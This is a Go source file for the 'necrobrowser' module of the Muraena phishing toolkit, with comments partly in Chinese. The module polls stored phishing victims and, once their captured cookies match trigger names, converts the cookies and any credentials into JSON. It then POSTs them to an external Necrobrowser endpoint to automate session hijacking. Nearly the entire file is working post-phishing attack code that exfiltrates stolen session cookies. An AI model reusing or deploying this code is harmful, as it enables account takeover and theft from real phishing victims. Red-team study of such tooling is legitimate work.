package necrobrowser

import (
	"encoding/json"
	"io/ioutil"
	"strings"
	"time"

	"github.com/muraenateam/muraena/log"

	"gopkg.in/resty.v1"

	"github.com/muraenateam/muraena/core/db"
	"github.com/muraenateam/muraena/session"
)

const (
	// Name of this module
	Name = "necrobrowser"

	// Description of this module
	Description = "Post-phishing automation via Necrobrowser-NG"

	// Author of this module
	Author = "Muraena Team"

	// Placeholders for templates
	TrackerPlaceholder     = "%%%TRACKER%%%"
	CookiePlaceholder      = "%%%COOKIES%%%"
	CredentialsPlaceholder = "%%%CREDENTIALS%%%"
)

// Necrobrowser module
type Necrobrowser struct {
	session.SessionModule

	Enabled  bool
	Endpoint string
	Profile  string

	Request string
}

// Cookies
type SessionCookie struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Domain   string `json:"domain"`
	Expires  int64  `json:"expirationDate"`
	Path     string `json:"path"`
	HTTPOnly bool   `json:"httpOnly"`
	Secure   bool   `json:"secure"`
	Session  bool   `json:"session"`
}

// VictimCredentials structure
type VictimCredentials struct {
	Key   string
	Value string
	Time  time.Time
}

// Name 返回模块名
func (module *Necrobrowser) Name() string {
	return Name
}

// Description 返回模块描述
func (module *Necrobrowser) Description() string {
	return Description
}

// Author 返回模块作者
func (module *Necrobrowser) Author() string {
	return Author
}

// Prompt 根据提供的参数打印模块状态
func (module *Necrobrowser) Prompt() {
	module.Raw("No options are available for this module")
}

func Load(s *session.Session) (m *Necrobrowser, err error) {

	m = &Necrobrowser{
		SessionModule: session.NewSessionModule(Name, s),
		Enabled:       s.Config.NecroBrowser.Enabled,
	}

	if !m.Enabled {
		m.Debug("is disabled")
		return
	}

	config := s.Config.NecroBrowser
	m.Endpoint = config.Endpoint

	m.Profile = config.Profile
	bytes, err := ioutil.ReadFile(m.Profile)
	if err != nil {
		m.Warning("Error reading profile file %s: %s", m.Profile, err)
		m.Enabled = false
		return
	}
	// m.Request 为读取 config.Profile 的内容
	m.Request = string(bytes)

	// go 例程，每隔 N 秒检查所有受害者的 cookie jar，以查看是否有任何会话准备好进行检测
	if s.Config.NecroBrowser.Enabled {
		go m.CheckSessions()
	}

	return
}

func (module *Necrobrowser) CheckSessions() {

	triggerType := module.Session.Config.NecroBrowser.Trigger.Type
	triggerDelay := module.Session.Config.NecroBrowser.Trigger.Delay

	for {
		switch triggerType {
		case "cookies":
			module.CheckSessionCookies()
		case "path":
			// TODO
			log.Warning("currently unsupported. TODO implement path")
		default:
			log.Warning("unsupported trigger type: %s", triggerType)
		}

		time.Sleep(time.Duration(triggerDelay) * time.Second)
	}
}

func (module *Necrobrowser) CheckSessionCookies() {
	triggerValues := module.Session.Config.NecroBrowser.Trigger.Values
	// 获取被攻击的浏览器（victim）信息
	victims, err := db.GetAllVictims()
	if err != nil {
		module.Debug("error fetching all victims: %s", err)
	}

	// module.Debug("checkSessions: we have %d victim sessions. Checking authenticated ones.. ", len(victims))
	// 查看 cookie 名称是否在 triggerValues 中
	for _, v := range victims {
		cookiesFound := 0
		cookiesNeeded := len(triggerValues)
		for _, cookie := range v.Cookies {
			if Contains(&triggerValues, cookie.Name) {
				cookiesFound++
			}
		}
		// triggerValues 在 cookie 中都被找到，且 v.SessionInstrumented 未被检测
		if cookiesNeeded == cookiesFound && !v.SessionInstrumented {
			module.Instrument(v.ID, v.Cookies, "[]") // 添加凭据
			// 防止 session 被检测两次
			_ = db.SetSessionAsInstrumented(v.ID)
		}
	}
}

func Contains(slice *[]string, find string) bool {
	for _, a := range *slice {
		if a == find {
			return true
		}
	}
	return false
}

func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCookie, credentialsJSON string) {

	var necroCookies []SessionCookie
	const timeLayout = "2006-01-02 15:04:05 -0700 MST"

	for _, c := range cookieJar {
		// t = 过期时间
		module.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
		t, err := time.Parse(timeLayout, c.Expires)
		if err != nil {
			module.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
			continue
		}

		nc := SessionCookie{
			Name:     c.Name,
			Value:    c.Value,
			Domain:   c.Domain,
			Expires:  t.Unix(),
			Path:     c.Path,
			HTTPOnly: c.HTTPOnly,
			Secure:   c.Secure,
			Session:  t.Unix() < 1,
		}

		necroCookies = append(necroCookies, nc)
	}
	// 将 necroCookies 转为 json 字符串
	c, err := json.MarshalIndent(necroCookies, "", "\t")
	if err != nil {
		module.Warning("Error marshalling the cookies: %s", err)
		return
	}
	// 将 request 请求中的 cookie、credentials 等填充
	cookiesJSON := string(c)
	module.Request = strings.ReplaceAll(module.Request, TrackerPlaceholder, victimID)
	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)

	module.Debug(" Sending to NecroBrowser cookies:\n%v", cookiesJSON)
	// 发送 request 请求
	client := resty.New()
	resp, err := client.R().
		SetHeader("Content-Type", "application/json").
		SetBody(module.Request).
		Post(module.Endpoint)

	if err != nil {
		return
	}

	module.Info("NecroBrowser Response: %+v", resp)
	return
}
